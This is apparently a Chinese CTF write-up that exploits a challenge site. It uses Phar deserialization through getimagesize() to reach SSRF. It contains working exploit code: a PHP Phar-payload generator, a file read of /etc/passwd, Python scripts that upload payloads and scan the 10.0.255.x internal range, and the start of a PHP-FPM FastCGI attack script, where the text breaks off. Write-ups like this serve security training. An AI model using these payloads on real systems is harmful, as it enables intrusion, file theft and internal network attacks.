<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// catchmime.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();  </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$output</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$this_is_a_easy_test</span>=unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;careful&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this_is_a_easy_test</span>-&gt;funny_get() === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$check</span> = getimagesize(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$check</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is an image - &quot;</span> . <span class="variable">$check</span>[<span class="string">&quot;mime&quot;</span>] . <span class="string">&quot;.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// upload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$target_dir</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"><span class="variable">$uploadOk</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$imageFileType</span>=substr(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>],<span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>,strlen(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_name</span> = md5(time());</span><br><span class="line"><span class="variable">$file_name</span> =substr(<span class="variable">$file_name</span>, <span class="number">0</span>, <span class="number">10</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$imageFileType</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$target_file</span>=<span class="variable">$target_dir</span>.<span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$check</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$check</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is an image - &quot;</span> . <span class="variable">$check</span>[<span class="string">&quot;mime&quot;</span>] . <span class="string">&quot;.&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image.&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="variable">$target_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, file already exists.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file is too large.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$imageFileType</span> !== <span class="string">&quot;jpg&quot;</span> &amp;&amp; <span class="variable">$imageFileType</span> !== <span class="string">&quot;png&quot;</span> &amp;&amp; <span class="variable">$imageFileType</span> !== <span class="string">&quot;gif&quot;</span> &amp;&amp; <span class="variable">$imageFileType</span> !== <span class="string">&quot;jpeg&quot;</span>  ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, only jpg,png,gif,jpeg are allowed.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$uploadOk</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file was not uploaded.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;The file <span class="subst">$file_name</span>  has been uploaded to ./uploads/&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>catchmime.php</code>有两个类<code>EsayTest</code>,<code>Main</code>.第一个类没啥看的暂且按下不表，<code>Main</code>这个类的<code>curl</code>方法可以看出到没对<code>$url</code>参数做限制，如果参数可控那么可能造成<code>SSRF</code>和<code>任意文件读取</code>.第二个为魔术方法，其中调用了<code>Main</code>类的<code>curl</code>方法，但是前提为<code>funny_get</code>方法的返回值为<code>1</code>.这里的<code>funy_get</code>方法来自第一个类，然后又有反序列化，且参数可控，因此将第一个类的<code>$test</code>值设为<code>1</code>即可。就可调用<code>Main</code>类的<code>curl</code>方法。那么接下来就找调用了<code>Main</code>类的触发就<code>Ok</code>了。看了题目的功能点就是上传文件，和一个检查文件类型，结合题目就想到<code>Phar</code>反序列化，那么就不用<code>unserialize()</code>函数就可以触发反序列化了。触发了<code>Main</code>类那么就可以造成上面分析的两种漏洞。发现<code>getimagesize</code>函数的参数我们可控，这个函数本身也是属于<code>IO</code>操作，于是可以触发<code>Phar</code>反序列化。</li>
<li><code>upload.php</code>，上传文件名不可控，为<code>MD5</code>的随机时间戳截取前10位。白名单限制文件上传为<code>[&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;,&#39;jpeg&#39;]</code>其中的一种。上传<code>shell</code>几乎是不可能了，这里也许也有<code>Phar</code>反序列化，但是由于名字这些参数不可控，那么没办法了。就只有前面的漏洞了。</li>
</ul>
<h4 id="POC-文件读取"><a href="#POC-文件读取" class="headerlink" title="POC  文件读取"></a>POC  文件读取</h4><ul>
<li><p>有了上面的分析，我们就用<code>file://</code>协议先构造任意文件读取吧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;file:///etc/passwd&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 因为$test 的属性问题需要url编码</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Easytest()));</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.png&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.png&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="keyword">new</span> Main());</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;Panda.txt&quot;</span>,<span class="string">&quot;I am Panda&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="comment">//O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D</span></span><br></pre></td></tr></table></figure></li>
<li><p>然后将生成的<code>Phar</code>文件后缀改成其中白名单的一种，上传后访问即可。有个坑谷歌浏览器<code>hackbar</code>对<code>submit</code>参数的提交不得行，火狐浏览器就<code>OK</code>，或者<code>Burp</code>就欧克了。<a target="_blank" rel="noopener" href="https://github.com/Mr-xn/hackbar2.1.3">火狐Hackbar</a></p>
</li>
</ul>
<p><img src="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/CurlReadFile.png" alt="ReadFile"></p>
<ul>
<li>读取<code>/etc/hosts/</code>并不会发现内网IP地址，因此需要读<code>/proc/net/arp/</code>，发现内网地址为10.0.255.1,但是这并不是需要攻击的<code>IP</code>地址，根据上面改写了个两个脚本来判断需要攻击的内网地址。第一个则是生成<code>Phar</code>文件。第二个则是将文件上传并访问看返回数据大小，最终发现内网IP不止一个？最后根据别人做题发现是<code>PHP-fpm</code>那个界面。IP为<code>10.0.255.11</code>。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">\\ D:\\phpstudy\\www\\EXP\poc.php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 因为$test 的属性问题需要url编码</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Easytest()));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;http://10.0.255.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> Main();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span> = <span class="number">1</span>;<span class="variable">$num</span>&lt;<span class="number">256</span>;<span class="variable">$num</span>++)&#123;</span><br><span class="line">    <span class="variable">$temp</span>-&gt;url = <span class="variable">$temp</span>-&gt;url.(<span class="keyword">string</span>)<span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$temp</span>-&gt;url.PHP_EOL;</span><br><span class="line">    print_r(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="variable">$num</span>.<span class="string">&quot;.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;Panda.txt&quot;</span>, <span class="string">&quot;I am Panda&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$temp</span>-&gt;url = <span class="string">&#x27;http://10.0.255.&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://b284968d-4bbd-491e-8e35-45d7e6f37b18.node3.buuoj.cn&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Upload</span>(<span class="params">name</span>):</span></span><br><span class="line">    PATH = <span class="string">&#x27;D:\\phpStudy\\www\\EXP\\&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(PATH+name):</span><br><span class="line">        os.rename(PATH+name,PATH+name.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">    files = &#123;<span class="string">&#x27;fileToUpload&#x27;</span>: (<span class="string">&#x27;phar.png&#x27;</span>,<span class="built_in">open</span>(PATH+name.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>))&#125;</span><br><span class="line">    response = requests.post(url=url+<span class="string">&#x27;/upload.php&#x27;</span>, files=files)</span><br><span class="line">    filename = re.findall(<span class="string">&quot;file (.*?.png)&quot;</span>,response.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">name</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>:<span class="string">&quot;phar://uploads/&#123;&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data[<span class="string">&quot;name&quot;</span>] = data[<span class="string">&quot;name&quot;</span>].<span class="built_in">format</span>(Upload(name))</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span> : <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>, &#125;</span><br><span class="line">    res = requests.post(url+<span class="string">&#x27;/catchmime.php?careful=O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D&#x27;</span>, data=data, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(name.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]+<span class="string">&quot; &quot;</span>*<span class="number">20</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(res.text)))</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    req(<span class="built_in">str</span>(num) + <span class="string">&#x27;.phar&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">          </span><br></pre></td></tr></table></figure>

<ul>
<li><code>Python</code>输出展示,</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>                    <span class="number">264</span></span><br><span class="line"><span class="number">2</span>                    <span class="number">264</span></span><br><span class="line"><span class="number">3</span>                    <span class="number">264</span></span><br><span class="line"><span class="number">4</span>                    <span class="number">266</span></span><br><span class="line"><span class="number">5</span>                    <span class="number">5835</span></span><br><span class="line"><span class="number">6</span>                    <span class="number">8099</span></span><br><span class="line"><span class="number">7</span>                    <span class="number">4891</span></span><br><span class="line"><span class="number">8</span>                    <span class="number">264</span></span><br><span class="line"><span class="number">9</span>                    <span class="number">1825</span></span><br><span class="line"><span class="number">10</span>                    <span class="number">264</span></span><br><span class="line"><span class="number">11</span>                    <span class="number">287</span></span><br><span class="line"><span class="number">12</span>                    <span class="number">264</span></span><br></pre></td></tr></table></figure>

<h4 id="SSRF-PHP-FPM"><a href="#SSRF-PHP-FPM" class="headerlink" title="SSRF PHP-FPM"></a>SSRF PHP-FPM</h4><ul>
<li>接下来就是用脚本打<code>PHP-fpm</code>了，<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html"><strong>PHITHON</strong></a>，<a target="_blank" rel="noopener" href="https://ctf.njupt.edu.cn/298.html#phar_matches_everything714pt_5solvers"><strong>X1ct34m</strong></a></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([i])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(c, <span class="built_in">int</span>):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span>(<span 